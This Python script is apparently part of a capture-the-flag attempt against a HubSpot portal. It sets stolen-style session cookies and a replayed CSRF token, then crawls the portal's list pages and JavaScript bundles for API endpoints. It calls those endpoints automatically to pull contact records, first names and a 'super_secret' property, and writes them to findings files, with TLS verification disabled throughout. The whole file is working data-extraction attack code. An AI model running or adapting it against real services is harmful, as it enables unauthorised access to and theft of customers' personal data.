#!/usr/bin/env python3
"""
The list pages are accessible with session cookies!
Let's extract all data from them
"""

import requests
import json
import re
import os
import urllib3
from dotenv import load_dotenv
from bs4 import BeautifulSoup

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = '46962361'

print("="*80)
print("EXTRACTING DATA FROM ACCESSIBLE LIST PAGES")
print("="*80)

session = requests.Session()

# Set cookies
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
}

findings = []

# ============================================================================
# 1. ANALYZE LIST PAGES
# ============================================================================

list_urls = [
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/lists',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/lists/public',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/lists/1',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/lists/2',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/lists/all',
]

for url in list_urls:
    print(f"\n{'='*80}")
    print(f"Analyzing: {url}")
    print("="*80)

    try:
        r = session.get(url, headers=headers, verify=False, timeout=15)

        print(f"Status: {r.status_code}")
        print(f"Size: {len(r.text)} bytes")

        if r.status_code != 200:
            continue

        html = r.text

        # Save HTML for analysis
        filename = url.split('/')[-1] or 'lists'
        with open(f'/home/user/Hub/findings/list_page_{filename}.html', 'w') as f:
            f.write(html)

        print(f"Saved: findings/list_page_{filename}.html")

        # Extract JavaScript bundles
        soup = BeautifulSoup(html, 'html.parser')
        scripts = soup.find_all('script', {'src': True})

        print(f"\nFound {len(scripts)} external scripts")

        # Download and analyze JavaScript bundles
        for i, script in enumerate(scripts[:15], 1):
            src = script.get('src')

            if not src.startswith('http'):
                src = 'https:' + src if src.startswith('//') else 'https://app.hubspot.com' + src

            # Only analyze list-related or contact-related bundles
            if any(term in src.lower() for term in ['list', 'contact', 'crm', 'record']):
                print(f"\n  [{i}] {src[:80]}...")

                try:
                    script_r = requests.get(src, verify=False, timeout=15)

                    if script_r.status_code == 200:
                        script_text = script_r.text

                        print(f"      Size: {len(script_text)} bytes")

                        # Look for contact data
                        if 'super_secret' in script_text.lower():
                            print(f"      *** Contains super_secret! ***")

                            # Extract context
                            matches = re.finditer(r'.{100}super_secret.{100}', script_text, re.I | re.DOTALL)
                            for match in list(matches)[:3]:
                                print(f"      Context: {match.group(0)}")

                        # Look for contact property values
                        if 'firstname' in script_text.lower():
                            # Try to find actual firstname values (not just the label)
                            firstname_patterns = [
                                r'"firstname"\s*:\s*"([^"]{3,50})"',
                                r'\'firstname\'\s*:\s*\'([^\']{3,50})\'',
                                r'firstname["\']?\s*[:=]\s*["\']([^"\']{3,50})["\']',
                            ]

                            for pattern in firstname_patterns:
                                matches = re.findall(pattern, script_text, re.IGNORECASE)
                                if matches:
                                    # Filter out common false positives
                                    for match in matches:
                                        if match.lower() not in ['text', 'string', 'name', 'value', 'field', 'input', 'firstname', 'first name', 'label']:
                                            print(f"      *** POTENTIAL FIRSTNAME: {match} ***")

                                            findings.append({
                                                'source': 'list_page_js',
                                                'url': url,
                                                'script': src,
                                                'type': 'firstname',
                                                'value': match
                                            })

                        # Look for API calls that might contain contact data
                        api_patterns = [
                            r'(https?://[^"\'\s]+/contacts/[^"\'\s]+)',
                            r'(https?://[^"\'\s]+/crm/[^"\'\s]+)',
                            r'(/api/[^"\'\s]+contacts[^"\'\s]*)',
                        ]

                        for pattern in api_patterns:
                            api_matches = re.findall(pattern, script_text)
                            if api_matches:
                                unique_apis = set(api_matches)
                                print(f"      API endpoints: {len(unique_apis)} found")

                                for api in list(unique_apis)[:5]:
                                    print(f"        {api}")

                                    # Try calling the API
                                    if api.startswith('http'):
                                        api_url = api
                                    elif api.startswith('/'):
                                        api_url = 'https://app.hubspot.com' + api
                                    else:
                                        continue

                                    # Add portal ID if needed
                                    if 'portalId=' not in api_url:
                                        sep = '&' if '?' in api_url else '?'
                                        api_url += f'{sep}portalId={TARGET_PORTAL}'

                                    try:
                                        api_r = session.get(api_url, headers=headers, verify=False, timeout=5)

                                        if api_r.status_code == 200:
                                            print(f"          API ACCESSIBLE: {api_r.status_code}")

                                            try:
                                                api_data = api_r.json()

                                                if 'super_secret' in json.dumps(api_data).lower():
                                                    print(f"          *** API CONTAINS super_secret! ***")
                                                    print(f"          {json.dumps(api_data, indent=2)[:500]}")

                                                    findings.append({
                                                        'source': 'api_from_list_page',
                                                        'url': api_url,
                                                        'data': api_data
                                                    })
                                            except:
                                                pass
                                    except:
                                        pass

                except Exception as e:
                    print(f"      Error: {str(e)[:80]}")

        # Look for inline data
        print("\n[*] Checking for inline data...")

        inline_scripts = soup.find_all('script', {'src': False})

        for script in inline_scripts:
            if script.string and len(script.string) > 100:
                script_text = script.string

                # Look for contact data in inline scripts
                if 'contact' in script_text.lower() or 'firstname' in script_text.lower():
                    # Try to extract JSON data
                    json_pattern = r'(\{[^{}]*"(?:firstname|super_secret|email)"[^{}]*\})'
                    json_matches = re.findall(json_pattern, script_text, re.IGNORECASE)

                    for match in json_matches[:5]:
                        try:
                            data = json.loads(match)
                            print(f"    Found data object: {json.dumps(data, indent=2)[:200]}")

                            if 'firstname' in data or 'super_secret' in data:
                                print(f"    *** CONTAINS CONTACT PROPERTIES! ***")

                                findings.append({
                                    'source': 'inline_script',
                                    'url': url,
                                    'data': data
                                })
                        except:
                            pass

    except Exception as e:
        print(f"Error: {str(e)[:100]}")

# ============================================================================
# 2. TRY TO ACCESS LIST DATA VIA API
# ============================================================================

print("\n" + "="*80)
print("TRYING LIST DATA APIs")
print("="*80)

# Extract CSRF token
csrf_token = None
if 'hubspotapi-csrf=' in SESSION_COOKIES:
    match = re.search(r'hubspotapi-csrf=([^;]+)', SESSION_COOKIES)
    if match:
        csrf_token = match.group(1)

api_headers = {
    **headers,
    'Accept': 'application/json',
}

if csrf_token:
    api_headers['X-HubSpot-CSRF-hubspotapi'] = csrf_token

# Try to get list of lists
list_api_urls = [
    f'https://app.hubspot.com/api/contacts/v1/lists?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/contacts/v1/lists/all?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/crm-lists/v1/lists?portalId={TARGET_PORTAL}',
]

for url in list_api_urls:
    print(f"\n{url[:70]}...")

    try:
        r = session.get(url, headers=api_headers, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  Data: {json.dumps(data, indent=2)[:500]}")

                # Check if we got list IDs
                if 'lists' in data:
                    print(f"  *** Found {len(data['lists'])} lists! ***")

                    # Try to get contacts from each list
                    for list_obj in data['lists'][:5]:
                        list_id = list_obj.get('listId')
                        if list_id:
                            print(f"\n  Trying to get contacts from list {list_id}...")

                            contacts_url = f'https://app.hubspot.com/api/contacts/v1/lists/{list_id}/contacts/all?portalId={TARGET_PORTAL}'

                            contacts_r = session.get(contacts_url, headers=api_headers, verify=False, timeout=10)
                            print(f"    Status: {contacts_r.status_code}")

                            if contacts_r.status_code == 200:
                                try:
                                    contacts_data = contacts_r.json()
                                    print(f"    *** GOT CONTACT DATA! ***")
                                    print(f"    {json.dumps(contacts_data, indent=2)[:800]}")

                                    if 'super_secret' in json.dumps(contacts_data).lower():
                                        print(f"\n    *** CONTAINS super_secret! ***")

                                        findings.append({
                                            'source': 'list_contacts_api',
                                            'list_id': list_id,
                                            'data': contacts_data
                                        })
                                except:
                                    print(f"    Response: {contacts_r.text[:300]}")
            except:
                print(f"  Response: {r.text[:300]}")
    except Exception as e:
        print(f"  Error: {str(e)[:80]}")

print("\n" + "="*80)
print("LIST PAGE EXTRACTION COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} POTENTIAL DATA POINTS! ***\n")

    for finding in findings:
        print(f"\n{finding.get('source')}:")
        print(f"  {json.dumps(finding, indent=2)[:600]}")

        # Check for CTF flag
        if finding.get('type') == 'firstname' and finding.get('value'):
            value = finding.get('value')

            # Filter out labels/placeholders
            if value.lower() not in ['text', 'name', 'firstname', 'first name', 'value', 'label']:
                print("\n" + "="*80)
                print("*** POTENTIAL CTF FLAG! ***")
                print("="*80)
                print(f"Firstname: {value}")

                with open('/home/user/Hub/findings/CTF_FLAG_FROM_LISTS.json', 'w') as f:
                    json.dump(finding, f, indent=2)

    with open('/home/user/Hub/findings/list_page_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print("\nSaved: findings/list_page_findings.json")
else:
    print("\nNo contact data extracted from list pages.")
